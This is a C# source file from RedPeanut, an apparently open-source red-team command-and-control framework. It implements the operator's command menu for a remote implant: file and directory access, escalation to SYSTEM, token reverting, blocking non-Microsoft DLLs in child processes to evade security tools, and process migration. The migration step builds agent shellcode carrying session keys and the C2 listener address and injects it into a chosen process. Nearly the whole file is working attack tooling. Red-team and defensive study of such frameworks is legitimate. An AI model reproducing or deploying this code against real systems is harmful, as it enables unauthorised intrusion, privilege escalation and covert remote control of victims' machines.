//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;
using static RedPeanut.Models;
using Newtonsoft.Json;
using System.Text;
using System.Linq;

namespace RedPeanut
{
    public class StandardCommand
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "pwd", "Get current Directory" },
            { "cd", "Change current Directory" },
            { "cat", "Read file content" },
            { "getuid", "Set username" },
            { "getsystem", "Set SYSTEM" },
            { "killagent", "Kill current agent" },
            { "managed", "Agent will run task in managed mode" },
            { "unmanaged", "Agent will run task in unmanaged mode" },
            { "blockdlls", "Agent block non Microsoft Dlls in child process" },
            { "unblockdlls", "Agent not block non Microsoft Dlls in child process" },
            { "migrate", "Migrate to another process" },
            { "reverttoself", "Revert all token" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, null);
            return;
        }

        IAgentInstance agent = null;

        string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);


        public StandardCommand()
        {

        }

        public StandardCommand(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public bool Execute(string input)
        {
            return StandardMenu(input);
        }

        private bool StandardMenu(string inputcmd)
        {
            string input = inputcmd.Split(" ")[0];
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "pwd":
                            RunPwd();
                            return true;
                        case "getuid":
                            RunGetUid();
                            return true;
                        case "cd":
                            RunGetCd(GetParsedSetString("set " + inputcmd));
                            return true;
                        case "cat":
                            RunGetCat(GetParsedSetString("set " + inputcmd));
                            return true;
                        case "getsystem":
                            RunGetSystem();
                            return true;
                        case "reverttoself":
                            RunReverToSelf();
                            return true;
                        case "killagent":
                            RunKillAgent();
                            return true;
                        case "managed":
                            RunSetManaged();
                            return true;
                        case "unmanaged":
                            RunSetUnManaged();
                            return true;
                        case "blockdlls":
                            RunSetBlockDlls();
                            return true;
                        case "unblockdlls":
                            RunSetUnBlockDlls();
                            return true;
                        case "migrate":
                            RunMigrate(GetParsedSetInt("set " + inputcmd));
                            return true;
                        default:
                            return false;
                    }
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        private void RunPwd()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetPwd", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunGetUid()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetUid", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunGetCd(string dir)
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetCd", "StandardCommandImpl.Program", new string[] { dir }, agent);
        }

        private void RunGetCat(string filepath)
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetCat", "StandardCommandImpl.Program", new string[] { filepath }, agent);
        }

        private void RunGetSystem()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetSystem", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunReverToSelf()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "RevertToSelf", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunKillAgent()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "KillAgent", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunSetManaged()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "managed"
            };

            InjectionManaged injectionManagedTask = new InjectionManaged();
            injectionManagedTask.Managed = true;

            msg.InjectionManagedTask = injectionManagedTask;

            agent.SendCommand(msg);

            agent.Managed = true;
        }

        private void RunSetUnManaged()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "managed"
            };

            InjectionManaged injectionManagedTask = new InjectionManaged();
            injectionManagedTask.Managed = false;

            msg.InjectionManagedTask = injectionManagedTask;

            agent.SendCommand(msg);

            agent.Managed = false;
        }

        private void RunSetBlockDlls()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "blockdlls"
            };

            BlockDlls blockDllsTask = new BlockDlls();
            blockDllsTask.Block = true;

            msg.BlockDllsTask = blockDllsTask;

            agent.SendCommand(msg);
        }

        private void RunSetUnBlockDlls()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "blockdlls"
            };

            BlockDlls blockDllsTask = new BlockDlls();
            blockDllsTask.Block = false;

            msg.BlockDllsTask = blockDllsTask;

            agent.SendCommand(msg);
        }

        private void RunMigrate(int pid)
        {
            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
            //Create RedPeanutAgent assembly
            string source = File.ReadAllText(Path.Combine(folderrpath, AGENT_TEMPLATE));

            ListenerConfig conf = new ListenerConfig("", ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(), RedPeanutC2.server.GetProfile(((AgentInstanceHttp)agent).GetProfileid()), ((AgentInstanceHttp)agent).GetProfileid());
            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), ((AgentInstanceHttp)agent).TargetFramework, conf);
            string b64CompressedAgent = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, agent.AgentId + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Agent)));
            string instanceid = RandomAString(10, new Random());

            //Create AgentState
            AgentState astate = new AgentState
            {
                Agentid = agent.AgentId,
                sessionkey = agent.AesManager.Key,
                sessioniv = agent.AesManager.IV,
                cookie = ((AgentInstanceHttp)agent).Cookie,
                RequestInstanceid = instanceid
            };
            if (agent.Pivoter != null)
                astate.pipename = agent.Pivoter.AgentId;

            string b64State = Convert.ToBase64String(Utility.CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(astate, Formatting.Indented))));
            string[] argsm = Utility.Split(b64State, 100).ToArray();

            //Read template
            source = File.ReadAllText(Path.Combine(folderrpath, MIGRATE_TEMPLATE));
            //Replace
            source = Replacer.ReplaceMigrate(source, Convert.ToBase64String(CompressGZipAssembly(
                Builder.GenerateShellcode(b64CompressedAgent, RandomAString(10, new Random()) + ".exe", "RedPeanutAgent.Worker", "LoadAndRun", argsm)
                )), pid);
            //Run
            string migrate = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Migrate)));
            RunAssemblyBase64(
                migrate,
                "RedPeanutMigrate",
                new string[] { " " },
                agent, tasktype: "migrate", instanceid: instanceid);
        }
    }
}
